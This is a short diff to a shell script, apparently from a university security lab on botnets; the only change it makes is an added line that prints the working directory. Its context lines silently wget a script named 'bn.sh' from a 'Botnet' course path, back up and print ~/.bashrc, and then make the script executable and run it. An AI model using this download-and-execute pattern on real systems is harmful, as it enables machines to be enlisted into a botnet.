@@ -13,6 +13,7 @@ wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bn.sh" &> /dev/null
 
 cp ~/.bashrc ~/.bashrc_old
 cat ~/.bashrc_old
+echo `pwd`
 
 chmod +x bn.sh
 ./bn.sh
